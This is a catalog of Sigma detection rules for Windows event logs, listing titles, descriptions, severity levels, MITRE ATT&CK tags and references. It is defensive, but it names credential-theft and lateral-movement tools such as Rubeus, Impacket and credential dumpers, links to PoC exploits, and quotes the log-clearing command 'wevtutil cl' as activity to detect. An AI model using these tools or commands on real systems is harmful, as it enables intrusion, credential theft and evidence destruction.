* https://www.fireeye.com/blog/threat-research/2019/01/bypassing-network-restrictions-through-rdp-tunneling.html

    
### Unauthorized System Time Modification
    
    Detect scenarios where a potentially unauthorized application or user is modifying the system time.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070.006
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_time_modification.yml
* Private Cuckoo Sandbox (from many years ago, no longer have hash, NDA as well)

* Live environment caused by malware

* https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4616

    
### Enumeration via the Global Catalog
    
    Detects enumeration of the global catalog (that can be performed using BloodHound or others AD reconnaissance tools). Adjust Threshold according to domain width.

    * Level: medium
    * MITRE: attack.discovery
    * MITRE: attack.t1087.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_global_catalog_enumeration.yml
* https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-5156

    
### Local User Creation
    
    Detects local user creation on windows servers, which shouldn't happen in an Active Directory environment. Apply this Sigma Use Case on your windows server logs and not on your DC logs.

    * Level: low
    * MITRE: attack.persistence
    * MITRE: attack.t1136.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_user_creation.yml
* https://patrick-bareiss.com/detecting-local-user-creation-in-ad-with-sigma/

    
### Windows Defender Exclusion Set
    
    Detects scenarios where an windows defender exclusion was added in registry where an entity would want to bypass test scanning from windows defender

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_defender_bypass.yml
* https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/

    
### Failed Code Integrity Checks
    
    Code integrity failures may indicate tampered executables.

    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_codeintegrity_check_failure.yml
    
### Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION
    
    Detects Obfuscated Powershell via VAR++ LAUNCHER

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_invoke_obfuscation_via_var_services_security.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Chafer Activity
    
    Detects Chafer activity attributed to OilRig as reported in Nyotron report in March 2018

    * Level: critical
    * MITRE: attack.persistence
    * MITRE: attack.g0049
    * MITRE: attack.t1053.005
    * MITRE: attack.s0111
    * MITRE: attack.t1543.003
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1112
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_apt_chafer_mar18_security.yml
* https://nyotron.com/nyotron-discovers-next-generation-oilrig-attacks/

    
### Invoke-Obfuscation Via Use Clip
    
    Detects Obfuscated Powershell via use Clip.exe in Scripts

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_invoke_obfuscation_via_use_clip_services_security.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Possible Remote Password Change Through SAMR
    
    Detects a possible remote NTLM hash change through SAMR API SamiChangePasswordUser() or SamSetInformationUser(). "Audit User Account Management" in "Advanced Audit Policy Configuration" has to be enabled in your local security policy / GPO to see this events.

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1212
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_samr_pwset.yml
    
### Kerberos Manipulation
    
    This method triggers on rare Kerberos Failure Codes caused by manipulations of Kerberos messages

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1212
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_kerberos_manipulation.yml
    
### Suspicious Driver Loaded By User
    
    Detects the loading of drivers via 'SeLoadDriverPrivilege' required to load or unload a device driver. With this privilege, the user can dynamically load and unload device drivers or other code in to kernel mode. This user right does not apply to Plug and Play device drivers. If you exclude privileged users/admins and processes, which are allowed to do so, you are maybe left with bad programs trying to load malicious kernel drivers. This will detect Ghost-In-The-Logs (https://github.com/bats3c/Ghost-In-The-Logs) and the usage of Sysinternals and various other tools. So you have to work with a whitelist to find the bad stuff.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_user_driver_loaded.yml
* https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/

* https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4673

    
### Azure AD Health Monitoring Agent Registry Keys Access
    
    This detection uses Windows security events to detect suspicious access attempts to the registry key of Azure AD Health monitoring agent.
This detection requires an access control entry (ACE) on the system access control list (SACL) of the following securable object HKLM\SOFTWARE\Microsoft\Microsoft Online\Reporting\MonitoringAgent.


    * Level: medium
    * MITRE: attack.discovery
    * MITRE: attack.t1012
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_aadhealth_mon_agent_regkey_access.yml
* https://o365blog.com/post/hybridhealthagent/

* https://github.com/OTRF/Set-AuditRule/blob/master/rules/registry/aad_connect_health_monitoring_agent.yml

    
### Disabling Windows Event Auditing
    
    Detects scenarios where system auditing (ie: windows event log auditing) is disabled. This may be used in a scenario where an entity would want to bypass local logging to evade detection when windows event logging is enabled and reviewed. Also, it is recommended to turn off "Local Group Policy Object Processing" via GPO, which will make sure that Active Directory GPOs take precedence over local/edited computer policies via something such as "gpedit.msc". Please note, that disabling "Local Group Policy Object Processing" may cause an issue in scenarios of one off specific GPO modifications -- however it is recommended to perform these modifications in Active Directory anyways.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_disable_event_logging.yml
* https://bit.ly/WinLogsZero2Hero

    
### RDP over Reverse SSH Tunnel WFP
    
    Detects svchost hosting RDP termsvcs communicating with the loopback address

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.command_and_control
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1090.001
    * MITRE: attack.t1090.002
    * MITRE: attack.t1021.001
    * MITRE: car.2013-07-002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_rdp_reverse_tunnel.yml
* https://twitter.com/SBousseaden/status/1096148422984384514

* https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES/blob/master/Command%20and%20Control/DE_RDP_Tunnel_5156.evtx

    
### Pass the Hash Activity 2
    
    Detects the attack technique pass the hash which is used to move laterally inside the network

    * Level: medium
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1550.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_pass_the_hash_2.yml
* https://github.com/iadgov/Event-Forwarding-Guidance/tree/master/Events

* https://blog.binarydefense.com/reliably-detecting-pass-the-hash-through-event-log-analysis

* https://blog.stealthbits.com/how-to-detect-pass-the-hash-attacks/

    
### SCM Database Privileged Operation
    
    Detects non-system users performing privileged operation os the SCM database

    * Level: critical
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_scm_database_privileged_operation.yml
* https://threathunterplaybook.com/notebooks/windows/07_discovery/WIN-190826010110.html

    
### Disabled Users Failing To Authenticate From Source Using Kerberos
    
    Detects failed logins with multiple disabled domain accounts from a single source system using the Kerberos protocol.

    * Level: medium
    * MITRE: attack.t1110.003
    * MITRE: attack.initial_access
    * MITRE: attack.privilege_escalation
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_failed_logons_single_source_kerberos2.yml
* https://docs.splunk.com/Documentation/ESSOC/3.22.0/stories/UseCase#Active_directory_password_spraying

    
### Pass the Hash Activity
    
    Detects the attack technique pass the hash which is used to move laterally inside the network

    * Level: medium
    * MITRE: attack.lateral_movement
    * MITRE: car.2016-04-004
    * MITRE: attack.t1550.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_pass_the_hash.yml
* https://github.com/iadgov/Event-Forwarding-Guidance/tree/master/Events

    
### Invalid Users Failing To Authenticate From Single Source Using NTLM
    
    Detects failed logins with multiple invalid domain accounts from a single source system using the NTLM protocol.

    * Level: medium
    * MITRE: attack.t1110.003
    * MITRE: attack.initial_access
    * MITRE: attack.privilege_escalation
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_failed_logons_single_source_ntlm2.yml
* https://docs.splunk.com/Documentation/ESSOC/3.22.0/stories/UseCase#Active_directory_password_spraying

    
### Suspicious Multiple File Rename Or Delete Occurred
    
    Detects multiple file rename or delete events occurrence within a specified period of time by a same user (these events may signalize about ransomware activity).

    * Level: medium
    * MITRE: attack.impact
    * MITRE: attack.t1486
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_multiple_files_renamed_or_deleted.yml
* https://www.manageengine.com/data-security/how-to/how-to-detect-ransomware-attacks.html

    
### Secure Deletion with SDelete
    
    Detects renaming of file while deletion with SDelete tool.

    * Level: medium
    * MITRE: attack.impact
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070.004
    * MITRE: attack.t1027.005
    * MITRE: attack.t1485
    * MITRE: attack.t1553.002
    * MITRE: attack.s0195
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_sdelete.yml
* https://jpcertcc.github.io/ToolAnalysisResultSheet/details/sdelete.htm

* https://www.jpcert.or.jp/english/pub/sr/ir_research.html

* https://docs.microsoft.com/en-gb/sysinternals/downloads/sdelete

    
### Invoke-Obfuscation RUNDLL LAUNCHER
    
    Detects Obfuscated Powershell via RUNDLL LAUNCHER

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_invoke_obfuscation_via_rundll_services_security.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### User Added to Local Administrators
    
    This rule triggers on user accounts that are added to the local Administrators group, which could be legitimate activity or a sign of privilege escalation activity

    * Level: medium
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1078
    * MITRE: attack.persistence
    * MITRE: attack.t1098
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_user_added_to_local_administrators.yml
    
### HybridConnectionManager Service Installation
    
    Rule to detect the Hybrid Connection Manager service installation.

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1554
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_hybridconnectionmgr_svc_installation.yml
* https://twitter.com/Cyb3rWard0g/status/1381642789369286662

    
### AD User Enumeration
    
    Detects access to a domain user from a non-machine account

    * Level: medium
    * MITRE: attack.discovery
    * MITRE: attack.t1087.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_ad_user_enumeration.yml
* https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf

* http://www.stuffithoughtiknew.com/2019/02/detecting-bloodhound.html

* https://docs.microsoft.com/en-us/windows/win32/adschema/attributes-all

    
### Access to ADMIN$ Share
    
    Detects access to $ADMIN share

    * Level: low
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_admin_share_access.yml
    
### Register new Logon Process by Rubeus
    
    Detects potential use of Rubeus via registered new trusted logon process

    * Level: critical
    * MITRE: attack.lateral_movement
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1558.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_register_new_logon_process_by_rubeus.yml
* https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1

    
### Scanner PoC for CVE-2019-0708 RDP RCE Vuln
    
    Detects the use of a scanner by zerosum0x0 that discovers targets vulnerable to  CVE-2019-0708 RDP RCE aka BlueKeep

    * Level: critical
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1210
    * MITRE: car.2013-07-002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_rdp_bluekeep_poc_scanner.yml
* https://twitter.com/AdamTheAnalyst/status/1134394070045003776

* https://github.com/zerosum0x0/CVE-2019-0708

    
### Impacket PsExec Execution
    
    Detects execution of Impacket's psexec.py.

    * Level: high
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_impacket_psexec.yml
* https://blog.menasec.net/2019/02/threat-hunting-3-detecting-psexec.html

    
### Suspicious Windows ANONYMOUS LOGON Local Account Created
    
    Detects the creation of suspicious accounts similar to ANONYMOUS LOGON, such as using additional spaces. Created as an covering detection for exclusion of Logon Type 3 from ANONYMOUS LOGON accounts.

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1136.001
    * MITRE: attack.t1136.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_local_anon_logon_created.yml
* https://twitter.com/SBousseaden/status/1189469425482829824

    
### Failed Logon From Public IP
    
    A login from a public IP can indicate a misconfigured firewall or network boundary.

    * Level: medium
    * MITRE: attack.initial_access
    * MITRE: attack.persistence
    * MITRE: attack.t1078
    * MITRE: attack.t1190
    * MITRE: attack.t1133
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_failed_logon_source.yml
    
### Suspicious Computer Account Name Change CVE-2021-42287
    
    Detects the renaming of an existing computer account to a account name that doesn't contain a $ symbol as seen in attacks against CVE-2021-42287

    * Level: critical
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_samaccountname_spoofing_cve_2021_42287.yml
* https://medium.com/@mvelazco/hunting-for-samaccountname-spoofing-cve-2021-42287-and-domain-controller-impersonation-f704513c8a45

    
### T1021 DCOM InternetExplorer.Application Iertutil DLL Hijack
    
    Detects a threat actor creating a file named `iertutil.dll` in the `C:\Program Files\Internet Explorer\` directory over the network for a DCOM InternetExplorer DLL Hijack scenario.

    * Level: critical
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.002
    * MITRE: attack.t1021.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_dcom_iertutil_dll_hijack.yml
* https://threathunterplaybook.com/notebooks/windows/08_lateral_movement/WIN-201009183000.html

    
### Weak Encryption Enabled and Kerberoast
    
    Detects scenario where weak encryption is enabled for a user profile which could be used for hash/password cracking.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_alert_enable_weak_encryption.yml
* https://adsecurity.org/?p=2053

* https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/

    
### Security Eventlog Cleared
    
    One of the Windows Eventlogs has been cleared. e.g. caused by "wevtutil cl" command execution

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070.001
    * MITRE: car.2016-04-002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_eventlog_cleared.yml
* https://twitter.com/deviouspolack/status/832535435960209408

* https://www.hybrid-analysis.com/sample/027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745?environmentId=100

    
### Password Protected ZIP File Opened
    
    Detects the extraction of password protected ZIP archives. See the filename variable for more details on which file has been opened.

    * Level: medium
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_opened_encrypted_zip.yml
* https://twitter.com/sbousseaden/status/1523383197513379841

    
### Tap Driver Installation
    
    Well-known TAP software installation. Possible preparation for data exfiltration using tunnelling techniques

    * Level: medium
    * MITRE: attack.exfiltration
    * MITRE: attack.t1048
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_security_tap_driver_installation.yml
    
### Azure AD Health Service Agents Registry Keys Access
    
    This detection uses Windows security events to detect suspicious access attempts to the registry key values and sub-keys of Azure AD Health service agents (e.g AD FS).
Information from AD Health service agents can be used to potentially abuse some of the features provided by those services in the cloud (e.g. Federation).
This detection requires an access control entry (ACE) on the system access control list (SACL) of the following securable object: HKLM:\SOFTWARE\Microsoft\ADHealthAgent.
Make sure you set the SACL to propagate to its sub-keys.


    * Level: medium
    * MITRE: attack.discovery
    * MITRE: attack.t1012
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_aadhealth_svc_agent_regkey_access.yml
* https://o365blog.com/post/hybridhealthagent/

* https://github.com/OTRF/Set-AuditRule/blob/master/rules/registry/aad_connect_health_service_agent.yml

    
### Login with WMI
    
    Detection of logins performed with WMI

    * Level: low
    * MITRE: attack.execution
    * MITRE: attack.t1047
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_wmi_login.yml
    
### Remote Task Creation via ATSVC Named Pipe
    
    Detects remote task creation via at.exe or API interacting with ATSVC namedpipe

    * Level: medium
    * MITRE: attack.lateral_movement
    * MITRE: attack.persistence
    * MITRE: car.2013-05-004
    * MITRE: car.2015-04-001
    * MITRE: attack.t1053.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_atsvc_task.yml
* https://blog.menasec.net/2019/03/threat-hunting-25-scheduled-tasks-for.html

    
### Suspicious Outbound Kerberos Connection
    
    Detects suspicious outbound network activity via kerberos default port indicating possible lateral movement or first stage PrivEsc via delegation.

    * Level: high
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1558.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_outbound_kerberos_connection.yml
* https://github.com/GhostPack/Rubeus

    
### Invoke-Obfuscation STDIN+ Launcher
    
    Detects Obfuscated use of stdin to execute PowerShell

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_invoke_obfuscation_stdin_services_security.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Remote PowerShell Sessions Network Connections (WinRM)
    
    Detects basic PowerShell Remoting (WinRM) by monitoring for network inbound connections to ports 5985 OR 5986

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_remote_powershell_session.yml
* https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190511223310.html

    
### Possible Zerologon (CVE-2020-1472) Exploitation
    
    Detects Netlogon Elevation of Privilege Vulnerability aka Zerologon (CVE-2020-1472)

    * Level: high
    * MITRE: attack.t1068
    * MITRE: attack.privilege_escalation
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_privesc_cve_2020_1472.yml
* https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1472

* https://www.logpoint.com/en/blog/detecting-zerologon-vulnerability-in-logpoint/

    
### Possible Impacket SecretDump Remote Activity
    
    Detect AD credential dumping using impacket secretdump HKTL

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.002
    * MITRE: attack.t1003.004
    * MITRE: attack.t1003.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_impacket_secretdump.yml
* https://blog.menasec.net/2019/02/threat-huting-10-impacketsecretdump.html

    
### Credential Dumping Tools Service Execution
    
    Detects well-known credential dumping tools execution via service execution events

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.execution
    * MITRE: attack.t1003.001
    * MITRE: attack.t1003.002
    * MITRE: attack.t1003.004
    * MITRE: attack.t1003.005
    * MITRE: attack.t1003.006
    * MITRE: attack.t1569.002
    * MITRE: attack.s0005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_security_mal_creddumper.yml
* https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment

    
### Remote WMI ActiveScriptEventConsumers
    
    Detect potential adversaries leveraging WMI ActiveScriptEventConsumers remotely to move laterally in a network

    * Level: high
    * MITRE: attack.lateral_movement
    * MITRE: attack.privilege_escalation
    * MITRE: attack.persistence
    * MITRE: attack.t1546.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_scrcons_remote_wmi_scripteventconsumer.yml
* https://threathunterplaybook.com/notebooks/windows/08_lateral_movement/WIN-200902020333.html

    
### User Couldn't Call a Privileged Service 'LsaRegisterLogonProcess'
    
    The 'LsaRegisterLogonProcess' function verifies that the application making the function call is a logon process by checking that it has the SeTcbPrivilege privilege set. Possible Rubeus tries to get a handle to LSA.

    * Level: high
    * MITRE: attack.lateral_movement
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1558.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_user_couldnt_call_privileged_service_lsaregisterlogonprocess.yml
* https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1

    
### Possible DC Shadow
    
    Detects DCShadow via create new SPN

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1207
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_possible_dc_shadow.yml
* https://github.com/Neo23x0/sigma/blob/ec5bb710499caae6667c7f7311ca9e92c03b9039/rules/windows/builtin/win_dcsync.yml

* https://twitter.com/gentilkiwi/status/1003236624925413376

* https://gist.github.com/gentilkiwi/dcc132457408cf11ad2061340dcb53c2

* https://blog.alsid.eu/dcshadow-explained-4510f52fc19d

    
### Suspicious LDAP-Attributes Used
    
    Detects the usage of particular AttributeLDAPDisplayNames, which are known for data exchange via LDAP by the tool LDAPFragger and are additionally not commonly used in companies.

    * Level: high
    * MITRE: attack.t1001.003
    * MITRE: attack.command_and_control
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_ldap_dataexchange.yml
* https://medium.com/@ivecodoe/detecting-ldapfragger-a-newly-released-cobalt-strike-beacon-using-ldap-for-c2-communication-c274a7f00961

* https://blog.fox-it.com/2020/03/19/ldapfragger-command-and-control-over-ldap-attributes/

* https://github.com/fox-it/LDAPFragger

    
### An Application Is Uninstall
    
    An application have been remove check if it is a critical

    * Level: low
    * MITRE: attack.impact
    * MITRE: attack.t1489
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/application/win_builtin_remove_application.yml
    
### Microsoft Malware Protection Engine Crash
    
    This rule detects a suspicious crash of the Microsoft Malware Protection Engine

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1211
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/application/win_susp_msmpeng_crash.yml
* https://bugs.chromium.org/p/project-zero/issues/detail?id=1252&desc=5

* https://technet.microsoft.com/en-us/library/security/4022344

    
### Atera Agent Installation
    
    Detects successful installation of Atera Remote Monitoring & Management (RMM) agent as recently found to be used by Conti operators

    * Level: high
    * MITRE: attack.t1219
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/application/win_software_atera_rmm_agent_install.yml
* https://www.advintel.io/post/secret-backdoor-behind-conti-ransomware-operation-introducing-atera-agent

    
### LPE InstallerFileTakeOver PoC CVE-2021-41379
    
    Detects PoC tool used to exploit LPE vulnerability CVE-2021-41379

    * Level: high
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/application/win_vul_cve_2021_41379.yml
* https://github.com/klinix5/InstallerFileTakeOver

    
### Relevant Anti-Virus Event
    
    This detection method points out highly relevant Antivirus events

    * Level: high
    * MITRE: attack.resource_development
    * MITRE: attack.t1588
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/application/win_av_relevant_match.yml
* https://www.virustotal.com/gui/file/13828b390d5f58b002e808c2c4f02fdd920e236cc8015480fa33b6c1a9300e31

* https://www.virustotal.com/gui/file/15b57c1b68cd6ce3c161042e0f3be9f32d78151fe95461eedc59a79fc222c7ed

* https://www.virustotal.com/gui/file/5092b2672b4cb87a8dd1c2e6047b487b95995ad8ed5e9fc217f46b8bfb1b8c01

    
### Audit CVE Event
    
    Detects events generated by Windows to indicate the exploitation of a known vulnerability (e.g. CVE-2020-0601)

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.t1203
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1068
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1211
    * MITRE: attack.credential_access
    * MITRE: attack.t1212
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1210
    * MITRE: attack.impact
    * MITRE: attack.t1499.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/application/win_audit_cve.yml
* https://twitter.com/mattifestation/status/1217179698008068096

* https://twitter.com/VM_vivisector/status/1217190929330655232

* https://twitter.com/davisrichardg/status/1217517547576348673

* https://twitter.com/DidierStevens/status/1217533958096924676

* https://twitter.com/FlemmingRiis/status/1217147415482060800

    
### Backup Catalog Deleted
    
    Detects backup catalog deletions

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/application/win_susp_backup_delete.yml
* https://technet.microsoft.com/en-us/library/cc742154(v=ws.11).aspx

* https://www.hybrid-analysis.com/sample/ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa?environmentId=100

    
### CVE-2020-0688 Exploitation via Eventlog
    
    Detects the exploitation of Microsoft Exchange vulnerability as described in CVE-2020-0688

    * Level: high
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/application/win_vul_cve_2020_0688.yml
* https://www.trustedsec.com/blog/detecting-cve-20200688-remote-code-execution-vulnerability-on-microsoft-exchange-server/

* https://cyberpolygon.com/materials/okhota-na-ataki-ms-exchange-chast-2-cve-2020-0688-cve-2020-16875-cve-2021-24085/

    
### Potential Remote Desktop Connection to Non-Domain Host
    
    Detects logons using NTLM to hosts that are potentially not part of the domain.

    * Level: medium
    * MITRE: attack.command_and_control
    * MITRE: attack.t1219
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/ntlm/win_susp_ntlm_rdp.yml
* n/a

    
### NTLM Logon
    
    Detects logons using NTLM, which could be caused by a legacy source or attackers

    * Level: low
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1550.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/ntlm/win_susp_ntlm_auth.yml
* https://twitter.com/JohnLaTwC/status/1004895028995477505

* https://goo.gl/PsqrhT

    
### NTLM Brute Force
    
    Detects common NTLM brute force device names

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1110
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/ntlm/win_susp_ntlm_brute_force.yml
* https://www.varonis.com/blog/investigate-ntlm-brute-force

    
### USB Device Plugged
    
    Detects plugged USB devices

    * Level: low
    * MITRE: attack.initial_access
    * MITRE: attack.t1200
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/driverframeworks/win_usb_device_plugged.yml
* https://df-stream.com/2014/01/the-windows-7-event-log-and-usb-device/

* https://www.techrepublic.com/article/how-to-track-down-usb-flash-drive-usage-in-windows-10s-event-viewer/

    
### LSASS Access Detected via Attack Surface Reduction
    
    Detects Access to LSASS Process

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/windefend/win_alert_lsass_access.yml
* https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-exploit-guard/attack-surface-reduction-exploit-guard?WT.mc_id=twitter

    
### PSExec and WMI Process Creations Block
    
    Detects blocking of process creations originating from PSExec and WMI commands

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1047
    * MITRE: attack.t1569.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/windefend/win_defender_psexec_wmi_asr.yml
* https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/attack-surface-reduction?WT.mc_id=twitter#block-process-creations-originating-from-psexec-and-wmi-commands

* https://twitter.com/duff22b/status/1280166329660497920

    
### Windows Defender Threat Detection Disabled
    
    Detects disabling Windows Defender threat protection

    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/windefend/win_defender_disabled.yml
